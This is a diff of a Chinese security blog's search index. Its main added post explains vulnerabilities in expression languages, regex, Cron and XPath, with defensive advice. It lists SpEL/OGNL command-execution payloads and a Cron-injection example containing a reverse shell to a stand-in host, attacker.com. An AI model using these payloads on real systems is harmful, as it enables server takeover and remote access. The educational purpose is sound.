-<p>像雷电模拟器以及云服务启动之类的可能会在这里</p>
-<p><img src="/../image/taskschd/wps%E4%BA%91%E6%9C%8D%E5%8A%A1.png"></p>
-<h1 id="3-注册表（通用）"><a href="#3-注册表（通用）" class="headerlink" title="3.注册表（通用）"></a>3.注册表（通用）</h1><p>推荐工具<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns">Autoruns</a></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#<span class="built_in">cmd</span></span><br><span class="line">regedit</span><br></pre></td></tr></table></figure>
-
-<p>上面两个方法一个关闭服务，一个关闭计划任务差不多可以了，但有些是dll这些进程在注册表里，只能采用注册表删除，建议用微软自己的工具<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns">Autoruns</a>来disable，防止删除了其他系统数据</p>
-<p><img src="/../image/taskschd/%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8%E8%87%AA%E5%90%AF.png"></p>
-<p><code>TSVNCache.exe</code>等，常见<strong>注册表启动项</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>article</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>console常见命令</title>
     <url>/2025/04/29/%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h1 id="控制台命令"><a href="#控制台命令" class="headerlink" title="控制台命令"></a>控制台命令</h1><h4 id="简单document"><a href="#简单document" class="headerlink" title="简单document"></a>简单document</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取所有匹配的 input 元素</span></span><br><span class="line"><span class="keyword">const</span> inputs = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.un-input__inner&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取第一个输入框的值</span></span><br><span class="line"><span class="keyword">const</span> firstInputValue = inputs[<span class="number">0</span>].<span class="property">value</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取第二个输入框的值</span></span><br><span class="line"><span class="keyword">const</span> secondInputValue = inputs[<span class="number">1</span>].<span class="property">value</span>; </span><br></pre></td></tr></table></figure>
@@ -2614,6 +2633,149 @@
       </categories>
       <tags>
         <tag>console</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>常见表达式分析</title>
+    <url>/2026/02/04/%E5%B8%B8%E8%A7%81%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p><code>常见表达式</code></p>
+<p><strong>动态逻辑类：表达式语言 (Expression Language, EL)：</strong></p>
+<p><code>SpEL (Spring Expression Language)、OGNL (Object-Graph Navigation Language)、QL (Quick Language)</code></p>
+<p> <strong>数据库逻辑类：SQL 表达式</strong></p>
+<p><strong>文本处理类：正则表达式</strong></p>
+<p><strong>定时任务类：Cron 表达式</strong></p>
+<p><strong>数据导航类：XPath 路径表达式</strong></p>
+<span id="more"></span>
+
+<h1 id="1-表达式语言"><a href="#1-表达式语言" class="headerlink" title="1-表达式语言"></a>1-表达式语言</h1><h3 id="危害：java代码执行"><a href="#危害：java代码执行" class="headerlink" title="危害：java代码执行"></a>危害：java代码执行</h3><p>蓝凌 <code>OA</code> 等 <code>Java</code> 系产品的很多漏洞都源于 **<code>SpEL 注入</code>**，攻击者可以通过特定的表达式直接执行 <code>java.lang.Runtime.getRuntime().exec()</code> 来拿下服务器权限</p>
+<p>常用的执行命令有：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#java.lang.ProcessBuilder</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;whoami&quot;</span>]).start();</span><br><span class="line">#java.lang.Runtime</span><br><span class="line">function <span class="title function_">test</span><span class="params">()</span>&#123; <span class="keyword">return</span> java.lang.Runtime&#125;;r=test();r.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>其他可能存在危害的链式命令：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#java.io.File(专门用于打开文件/URL)</span><br><span class="line">java.awt.Desktop.getDesktop().open(<span class="keyword">new</span> <span class="title class_">java</span>.io.File(<span class="string">&quot;/Users/name/Desktop/test.txt&quot;</span>));</span><br><span class="line">#javax.script.ScriptEngineManager(通过 JS 引擎间接执行)</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">javax</span>.script.ScriptEngineManager().getEngineByName(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;whoami&#x27;)&quot;</span>);</span><br><span class="line">#com.sun.jmx.mbeanserver.JmxMBeanServer (反射调用)</span><br><span class="line">((java.lang.Runtime)com.sun.jmx.mbeanserver.JmxMBeanServer.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>)).exec(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">#java.lang.instrument.Instrumentation (通过 Agent 注入)</span><br><span class="line">inst.retransformClasses(TargetClass.class); <span class="comment">// 通过修改类来实现命令执行</span></span><br><span class="line">#Apache Commons Exec（第三方库）</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">org</span>.apache.commons.exec.DefaultExecutor().execute(org.apache.commons.exec.CommandLine.parse(<span class="string">&quot;whoami&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><strong>方式</strong></th>
+<th><strong>适用场景</strong></th>
+<th><strong>优点</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Desktop</strong></td>
+<td>打开文件、图片、浏览器</td>
+<td>跨平台，自动关联程序</td>
+</tr>
+<tr>
+<td><strong>ScriptEngine</strong></td>
+<td>动态执行、规则引擎</td>
+<td>语法灵活，适合动态调用</td>
+</tr>
+<tr>
+<td><strong>Commons Exec</strong></td>
+<td>企业级生产环境</td>
+<td>完善的超时控制、流处理</td>
+</tr>
+<tr>
+<td><strong>Reflection&#x2F;JMX</strong></td>
+<td>框架底层、绕过限制</td>
+<td>隐蔽性强，不直接依赖显式类</td>
+</tr>
+</tbody></table>
+<h1 id="2-正则表达式"><a href="#2-正则表达式" class="headerlink" title="2-正则表达式"></a>2-正则表达式</h1><p><code>正则表达式不写注释简直是一串乱码，上午写的，下午就不认识了，但一般不会存在太大的漏洞</code></p>
+<h3 id="危害：ReDoS"><a href="#危害：ReDoS" class="headerlink" title="危害：ReDoS"></a><strong>危害：ReDoS</strong></h3><p>ReDoS（正则表达式拒绝服务攻击）<strong>危险示例：</strong> <code>^(a+)+$</code></p>
+<h3 id="危害：注入攻击"><a href="#危害：注入攻击" class="headerlink" title="危害：注入攻击"></a>危害：注入攻击</h3><p>正则表达式是<strong>动态构建</strong>且包含用户输入的，就可能引发信息泄露、逻辑绕过等风险，例如查询接口的<code>*</code>查询</p>
+<h3 id="危害：命令注入"><a href="#危害：命令注入" class="headerlink" title="危害：命令注入"></a>危害：命令注入</h3><p>老生常谈，表达式直接拼接到命令行操作（一般遵循安全代码规范就不会有）</p>
+<h1 id="3-Cron-表达式"><a href="#3-Cron-表达式" class="headerlink" title="3-Cron 表达式"></a>3-Cron 表达式</h1><p><code>一般问题出现在Cron 表达式对于系统权限、执行逻辑以及资源调度方面</code></p>
+<h3 id="危害：异常任务执行"><a href="#危害：异常任务执行" class="headerlink" title="危害：异常任务执行"></a>危害：异常任务执行</h3><p>操作员的定时任务能覆盖影响到管理员的定时任务，或者绕过正常逻辑（例如不能每天执行，但通过<code>0 0 31 2 *</code>每天执行）</p>
+<h3 id="危害：dos"><a href="#危害：dos" class="headerlink" title="危害：dos"></a>危害：dos</h3><p> 攻击者修改请求，将表达式改为 <code>* * * * *</code>（每分钟执行一次，某些扩展语法甚至支持秒级 <code>* * * * * *</code>）</p>
+<h3 id="危害：命令注入-1"><a href="#危害：命令注入-1" class="headerlink" title="危害：命令注入"></a>危害：命令注入</h3><p>老生常谈，表达式直接拼接到命令行操作（一般遵循安全代码规范就不会有）</p>
+<p><strong>换行符绕过：</strong> 在 Cron 场景下，<code>\n</code> 或 <code>\r</code> 就能开启一行全新的恶意指令。</p>
+<p><strong>编码绕过：</strong> 攻击者可以使用十六进制、Base64 或特定的字符编码（如 ANSI-C quoting <code>$&#39;...&#39;</code>）来绕过简单的字符串匹配。</p>
+<p><strong>空字节截断：</strong> 在某些底层语言中，使用 <code>%00</code> 可能导致字符串在逻辑检查后被截断，从而改变最终执行的命令。</p>
+<p><strong>伪代码：</strong></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 假设后端接收用户输入的 cron_time，意图是创建一个定期清理日志的任务</span><br><span class="line"># 开发者以为用户只会输入 &quot;* * * * *&quot;</span><br><span class="line">target_cmd=&quot;cleanup_logs.sh&quot;</span><br><span class="line"><span class="built_in">echo</span> &quot;$user_cron_input root $target_cmd&quot; &gt;&gt; /etc/cron.d/user_tasks</span><br><span class="line"></span><br><span class="line">#payload</span><br><span class="line">*/<span class="number">1</span> * * * * root /bin/sh -i &gt;&amp; /dev/tcp/attacker.com/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">#</span><br></pre></td></tr></table></figure>
+
+<h1 id="4-XPath-路径表达式"><a href="#4-XPath-路径表达式" class="headerlink" title="4-XPath 路径表达式"></a>4-XPath 路径表达式</h1><p><a href="https://www.cnblogs.com/xiongbatianduxing/p/19085925#11__13">XPath语法完全指南（实战详解版） - 熊文豪1 - 博客园</a></p>
+<h3 id="危害：目录遍历"><a href="#危害：目录遍历" class="headerlink" title="危害：目录遍历"></a>危害：目录遍历</h3><p>不过滤拼接</p>
+<p><strong>伪代码：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path = <span class="string">&quot;/var/www/images/&quot;</span> + request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">file = <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="危害：XPath-注入"><a href="#危害：XPath-注入" class="headerlink" title="危害：XPath 注入"></a>危害：XPath 注入</h3><p>老生常谈，直接拼接</p>
+<p><strong>伪代码：</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不安全：直接拼接用户名</span></span><br><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;//user[username/text()=&#x27;&quot;</span> + userInput + <span class="string">&quot;&#x27; and password/text()=&#x27;&quot;</span> + pwd + <span class="string">&quot;&#x27;]&quot;</span>;</span><br><span class="line">xpath.evaluate(query, doc);</span><br></pre></td></tr></table></figure>
+
+<h3 id="危害：JSONPath"><a href="#危害：JSONPath" class="headerlink" title="危害：JSONPath"></a>危害：JSONPath</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 查找商店里所有书的作者 */</span></span><br><span class="line">$.store.<span class="property">book</span>[*].<span class="property">author</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 查找价格低于 10 的书 */</span></span><br><span class="line">$.store.<span class="property">book</span>[?(@.<span class="property">price</span> &lt; <span class="number">10</span>)]</span><br></pre></td></tr></table></figure>
+
+<h3 id="危害：dos-1"><a href="#危害：dos-1" class="headerlink" title="危害：dos"></a>危害：dos</h3><p>复杂的递归查找表达式或者深层嵌套等（<code>$..*</code>）</p>
+<h3 id="危害：命令执行"><a href="#危害：命令执行" class="headerlink" title="危害：命令执行"></a>危害：命令执行</h3><p>对象图导航 (OGNL &#x2F; SpEL) ，用到了其他表达式（如 Java 的 OGNL，Spring 的 SpEL）；通常用于 Web 框架（如 Struts2, Spring MVC）的数据绑定</p>
+<p><strong>示例 (OGNL)：</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 访问 user 对象的 name 属性 */</span></span><br><span class="line">user.name</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 调用方法（高危！） */</span></span><br><span class="line"><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&quot;calc&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="xpath简单总结"><a href="#xpath简单总结" class="headerlink" title="xpath简单总结"></a>xpath简单总结</h3><table>
+<thead>
+<tr>
+<th><strong>表达式类型</strong></th>
+<th><strong>主要用途</strong></th>
+<th><strong>核心风险</strong></th>
+<th><strong>防御策略</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>XPath</strong></td>
+<td>XML 数据查询</td>
+<td><strong>数据泄露 &#x2F; 认证绕过</strong></td>
+<td>使用参数化查询接口（如 Java 的 <code>XPathVariableResolver</code>），严禁字符串拼接。</td>
+</tr>
+<tr>
+<td><strong>JSONPath</strong></td>
+<td>JSON 数据提取</td>
+<td><strong>逻辑错误 &#x2F; DoS</strong></td>
+<td>限制递归深度，避免在后端使用拼接方式构建过滤逻辑。</td>
+</tr>
+<tr>
+<td><strong>OGNL&#x2F;SpEL</strong></td>
+<td>对象属性绑定</td>
+<td><strong>RCE (远程代码执行)</strong></td>
+<td><strong>最危险。</strong> 严格限制表达式求值上下文，禁止调用静态方法，升级框架补丁。</td>
+</tr>
+</tbody></table>
+<h1 id="5-建议："><a href="#5-建议：" class="headerlink" title="5-建议："></a>5-建议：</h1><table>
+<thead>
+<tr>
+<th><strong>规范级别</strong></th>
+<th><strong>处理方式</strong></th>
+<th><strong>安全性</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>最优 (Best)</strong></td>
+<td>**参数化调用 (Parameterized API)**。不通过 Shell 解析，直接将参数传递给操作系统内核（如 Python 的 <code>subprocess.run([&quot;cmd&quot;, &quot;arg1&quot;])</code>）。</td>
+<td><strong>极高</strong></td>
+</tr>
+<tr>
+<td><strong>次优 (Good)</strong></td>
+<td>**白名单校验 (Whitelisting)**。只允许预定义的、已知的安全值，拒绝一切其他输入。</td>
+<td><strong>高</strong></td>
+</tr>
+<tr>
+<td><strong>危险 (Unsafe)</strong></td>
+<td><strong>黑名单过滤 + 字符串拼接</strong>。试图拦截 <code>;</code> 等字符。</td>
+<td><strong>极低</strong></td>
+</tr>
+<tr>
+<td><strong>自杀 (Suicidal)</strong></td>
+<td><strong>直接字符串拼接</strong>。完全信任用户输入。</td>
+<td><strong>零</strong></td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>Backend</tag>
       </tags>
   </entry>
   <entry>
@@ -2812,38 +2974,6 @@
       </tags>
   </entry>
   <entry>
-    <title>正则匹配脚本</title>
-    <url>/2024/12/23/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E8%84%9A%E6%9C%AC/</url>
-    <content><![CDATA[<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><p>今天上班的时候，老是发现uuid这些长id，我要想利用又懒得一个个复制，所以搞了一个脚本扩展，因为我是新手嘛，所以这个脚本有蛮多毛病，这章专门用来介绍哪些毛病，方便以后想改了，拿出来看看好找到要改的地方，我脚本放到github了，以防自己改炸了还有备份</p>
-<p>顺便记录一下排查api的正则</p>
-<span id="more"></span>
-
-<h2 id="问题点"><a href="#问题点" class="headerlink" title="问题点"></a>问题点</h2><p>1、python代码里只匹配了双引号和单引号</p>
-<p>2、直接将匹配到的内容写入文件—空格字符和回车字符</p>
-<p>3、没有检查匹配字符的过程—不能实时的查看自己的匹配过程	&#x2F;&#x2F;主要</p>
-<h1 id="正则记录"><a href="#正则记录" class="headerlink" title="正则记录"></a>正则记录</h1><h3 id="以method为特征值"><a href="#以method为特征值" class="headerlink" title="以method为特征值"></a>以method为特征值</h3><p>&#x3D;&#x3D;&gt;遍历 js 跑出 api 的个数：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">method\s*:\s*&quot;(post|get)&quot;</span><br></pre></td></tr></table></figure>
-
-<h3 id="以path为特征值"><a href="#以path为特征值" class="headerlink" title="以path为特征值"></a>以path为特征值</h3><p>&#x3D;&#x3D;&gt;遍历 js 尽可能跑出 api 以及虚拟页面的值：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 定义匹配的正则表达式和分类标签</span><br><span class="line">	含重复的正则</span><br><span class="line">pattern_groups = &#123;</span><br><span class="line">    &quot;PagePath Matches&quot;: [</span><br><span class="line">        (re.compile(r&#x27;[Pp][Aa][Gg][Ee][Pp][Aa][Tt][Hh]:\s*&quot;(.*?)&quot;&#x27;), &quot;pagePath_double_quotes&quot;),</span><br><span class="line">        (re.compile(r&quot;[Pp][Aa][Gg][Ee][Pp][Aa][Tt][Hh]:\s*&#x27;(.*?)&#x27;&quot;), &quot;pagePath_double_quotes&quot;),</span><br><span class="line">    ],</span><br><span class="line">    &quot;Path Matches&quot;: [</span><br><span class="line">        (re.compile(r&#x27;[Pp][Aa][Tt][Hh]:\s*&quot;(.*?)&quot;&#x27;), &quot;path_double_quotes&quot;),</span><br><span class="line">        (re.compile(r&quot;[Pp][Aa][Tt][Hh]:\s*&#x27;(.*?)&#x27;&quot;), &quot;path_double_quotes&quot;),</span><br><span class="line">        (re.compile(r&#x27;[Uu][Rr][Ll]:\s*&quot;([^&quot;]+)&quot;&#x27;), &quot;path_double_quotes&quot;),</span><br><span class="line">        (re.compile(r&#x27;[Uu][Rr][Ll]: &quot;([^&quot;]+)&#x27;), &quot;path_double_quotes&quot;),</span><br><span class="line">    ],</span><br><span class="line">    &quot;GET Matches&quot;: [</span><br><span class="line">        (re.compile(r&#x27;[Gg][Ee][Tt]\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;), &quot;&quot;),</span><br><span class="line">        (re.compile(r&quot;[Gg][Ee][Tt]\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;), &quot;&quot;),</span><br><span class="line">        (re.compile(r&#x27;[Gg][Ee][Tt]\(\s*[&quot;\&#x27;]([^&quot;\&#x27;]+)[&quot;\&#x27;]\s*,&#x27;), &quot;&quot;)，</span><br><span class="line">    ],</span><br><span class="line">    &quot;POST Matches&quot;: [</span><br><span class="line">        (re.compile(r&#x27;[Pp][Oo][Ss][Tt]\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;), &quot;&quot;),</span><br><span class="line">        (re.compile(r&quot;[Pp][Oo][Ss][Tt]\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;), &quot;&quot;),</span><br><span class="line">        (re.compile(r&#x27;[Pp][Oo][Ss][Tt]\(\s*[&quot;\&#x27;]([^&quot;\&#x27;]+)[&quot;\&#x27;]\s*,&#x27;), &quot;&quot;)，</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="以特殊符号为特征值"><a href="#以特殊符号为特征值" class="headerlink" title="以特殊符号为特征值"></a>以特殊符号为特征值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1. 匹配完整 URL（含协议或协议相对）</span><br><span class="line">(?:&quot;|&#x27;)                              # 起始引号（单引号或双引号）</span><br><span class="line">((?:[a-zA-Z]&#123;1,10&#125;://|//)            # 协议：例如 http://、https://、ftp:// 或协议相对 //</span><br><span class="line">[^&quot;&#x27;/]&#123;1,&#125;\.                         # 主域名（不含引号或斜线）+ 点</span><br><span class="line">[a-zA-Z]&#123;2,&#125;[^&quot;&#x27;]&#123;0,&#125;)               # 顶级域名后缀（如 com/net）+ 可选路径</span><br><span class="line">(?:&quot;|&#x27;)                              # 结束引号</span><br><span class="line"></span><br><span class="line"># 中文解释：提取形如 &quot;https://example.com/path&quot; 或 &#x27;//cdn.xxx.com&#x27; 的完整 URL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 2. 匹配相对路径（以 /、../ 或 ./ 开头）</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line">((?:/|\.\./|\./)                     # 以 /、../ 或 ./ 开头</span><br><span class="line">[^&quot;&#x27;&gt;&lt;,;| *()(%%$^/\\\[\]]           # 第一个字符不能为特殊符号</span><br><span class="line">[^&quot;&#x27;&gt;&lt;,;|()]&#123;1,&#125;)                    # 后续字符为路径</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line"></span><br><span class="line"># 中文解释：提取形如 &quot;/api/user&quot;、&quot;../img/pic.png&quot; 的相对路径链接</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 3. 匹配目录+资源文件（如 action、js、png）</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line">([a-zA-Z0-9_\-/]&#123;1,&#125;/                # 至少一个目录名 + 斜杠</span><br><span class="line">[a-zA-Z0-9_\-/]&#123;1,&#125;                  # 文件名</span><br><span class="line">\.(?:[a-zA-Z]&#123;1,4&#125;|action)           # 文件后缀（如 .js/.css/.action）</span><br><span class="line">(?:[\?|/][^&quot;&#x27; ]&#123;0,&#125;|))               # 可选参数或路径，如 ?id=1</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line"></span><br><span class="line"># 中文解释：提取形如 &quot;admin/login.action&quot;、&quot;static/app.js?v=1&quot; 的接口或资源路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 4. 匹配单文件名 + 参数（如 login.php?id=1）</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line">([a-zA-Z0-9_\-]&#123;1,&#125;                  # 文件名</span><br><span class="line">\.(?:php|asp|aspx|jsp|json|          # 特定后缀（可扩展）</span><br><span class="line">action|html|js|txt|xml)</span><br><span class="line">(?:\?[^&quot;&#x27;]&#123;0,&#125;|))                    # 可选参数</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line"></span><br><span class="line"># 中文解释：提取形如 &quot;index.php?id=1&quot;、&quot;test.jsp&quot; 的单独接口文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 5. 匹配 .do/.cgi/.py 等其他接口风格</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line">([a-zA-Z0-9_\-/.]&#123;1,&#125;</span><br><span class="line">\.(?:do|cgi|py|rb|go)</span><br><span class="line">(?:\?[^&quot;&#x27;]&#123;0,&#125;|))</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line"></span><br><span class="line"># 中文解释：提取 &quot;.do&quot;、&quot;.cgi&quot;、&quot;.py&quot; 等扩展名接口（例如 WebLogic、老系统常见）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h1><p><a href="https://github.com/cliayn/bp_py_regular-expressions">bp插件</a></p>
-<p><a href="https://github.com/cliayn/re_js_api-dir">api脚本</a></p>
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>jython</tag>
-        <tag>Burp Suite</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>渗透测试基本流程</title>
     <url>/2025/09/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%96%E6%8E%98%E6%B5%81%E7%A8%8B/</url>
     <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>​	毕业工作第二年，才明白渗透测试工程师与红队差别很大，一个是固定的漏洞排查，一个是穷尽方法的绕过。</p>
@@ -2987,6 +3117,38 @@
       </tags>
   </entry>
   <entry>
+    <title>正则匹配脚本</title>
+    <url>/2024/12/23/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E8%84%9A%E6%9C%AC/</url>
+    <content><![CDATA[<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><p>今天上班的时候，老是发现uuid这些长id，我要想利用又懒得一个个复制，所以搞了一个脚本扩展，因为我是新手嘛，所以这个脚本有蛮多毛病，这章专门用来介绍哪些毛病，方便以后想改了，拿出来看看好找到要改的地方，我脚本放到github了，以防自己改炸了还有备份</p>
+<p>顺便记录一下排查api的正则</p>
+<span id="more"></span>
+
+<h2 id="问题点"><a href="#问题点" class="headerlink" title="问题点"></a>问题点</h2><p>1、python代码里只匹配了双引号和单引号</p>
+<p>2、直接将匹配到的内容写入文件—空格字符和回车字符</p>
+<p>3、没有检查匹配字符的过程—不能实时的查看自己的匹配过程	&#x2F;&#x2F;主要</p>
+<h1 id="正则记录"><a href="#正则记录" class="headerlink" title="正则记录"></a>正则记录</h1><h3 id="以method为特征值"><a href="#以method为特征值" class="headerlink" title="以method为特征值"></a>以method为特征值</h3><p>&#x3D;&#x3D;&gt;遍历 js 跑出 api 的个数：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">method\s*:\s*&quot;(post|get)&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="以path为特征值"><a href="#以path为特征值" class="headerlink" title="以path为特征值"></a>以path为特征值</h3><p>&#x3D;&#x3D;&gt;遍历 js 尽可能跑出 api 以及虚拟页面的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 定义匹配的正则表达式和分类标签</span><br><span class="line">	含重复的正则</span><br><span class="line">pattern_groups = &#123;</span><br><span class="line">    &quot;PagePath Matches&quot;: [</span><br><span class="line">        (re.compile(r&#x27;[Pp][Aa][Gg][Ee][Pp][Aa][Tt][Hh]:\s*&quot;(.*?)&quot;&#x27;), &quot;pagePath_double_quotes&quot;),</span><br><span class="line">        (re.compile(r&quot;[Pp][Aa][Gg][Ee][Pp][Aa][Tt][Hh]:\s*&#x27;(.*?)&#x27;&quot;), &quot;pagePath_double_quotes&quot;),</span><br><span class="line">    ],</span><br><span class="line">    &quot;Path Matches&quot;: [</span><br><span class="line">        (re.compile(r&#x27;[Pp][Aa][Tt][Hh]:\s*&quot;(.*?)&quot;&#x27;), &quot;path_double_quotes&quot;),</span><br><span class="line">        (re.compile(r&quot;[Pp][Aa][Tt][Hh]:\s*&#x27;(.*?)&#x27;&quot;), &quot;path_double_quotes&quot;),</span><br><span class="line">        (re.compile(r&#x27;[Uu][Rr][Ll]:\s*&quot;([^&quot;]+)&quot;&#x27;), &quot;path_double_quotes&quot;),</span><br><span class="line">        (re.compile(r&#x27;[Uu][Rr][Ll]: &quot;([^&quot;]+)&#x27;), &quot;path_double_quotes&quot;),</span><br><span class="line">    ],</span><br><span class="line">    &quot;GET Matches&quot;: [</span><br><span class="line">        (re.compile(r&#x27;[Gg][Ee][Tt]\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;), &quot;&quot;),</span><br><span class="line">        (re.compile(r&quot;[Gg][Ee][Tt]\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;), &quot;&quot;),</span><br><span class="line">        (re.compile(r&#x27;[Gg][Ee][Tt]\(\s*[&quot;\&#x27;]([^&quot;\&#x27;]+)[&quot;\&#x27;]\s*,&#x27;), &quot;&quot;)，</span><br><span class="line">    ],</span><br><span class="line">    &quot;POST Matches&quot;: [</span><br><span class="line">        (re.compile(r&#x27;[Pp][Oo][Ss][Tt]\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;), &quot;&quot;),</span><br><span class="line">        (re.compile(r&quot;[Pp][Oo][Ss][Tt]\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;), &quot;&quot;),</span><br><span class="line">        (re.compile(r&#x27;[Pp][Oo][Ss][Tt]\(\s*[&quot;\&#x27;]([^&quot;\&#x27;]+)[&quot;\&#x27;]\s*,&#x27;), &quot;&quot;)，</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="以特殊符号为特征值"><a href="#以特殊符号为特征值" class="headerlink" title="以特殊符号为特征值"></a>以特殊符号为特征值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1. 匹配完整 URL（含协议或协议相对）</span><br><span class="line">(?:&quot;|&#x27;)                              # 起始引号（单引号或双引号）</span><br><span class="line">((?:[a-zA-Z]&#123;1,10&#125;://|//)            # 协议：例如 http://、https://、ftp:// 或协议相对 //</span><br><span class="line">[^&quot;&#x27;/]&#123;1,&#125;\.                         # 主域名（不含引号或斜线）+ 点</span><br><span class="line">[a-zA-Z]&#123;2,&#125;[^&quot;&#x27;]&#123;0,&#125;)               # 顶级域名后缀（如 com/net）+ 可选路径</span><br><span class="line">(?:&quot;|&#x27;)                              # 结束引号</span><br><span class="line"></span><br><span class="line"># 中文解释：提取形如 &quot;https://example.com/path&quot; 或 &#x27;//cdn.xxx.com&#x27; 的完整 URL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 2. 匹配相对路径（以 /、../ 或 ./ 开头）</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line">((?:/|\.\./|\./)                     # 以 /、../ 或 ./ 开头</span><br><span class="line">[^&quot;&#x27;&gt;&lt;,;| *()(%%$^/\\\[\]]           # 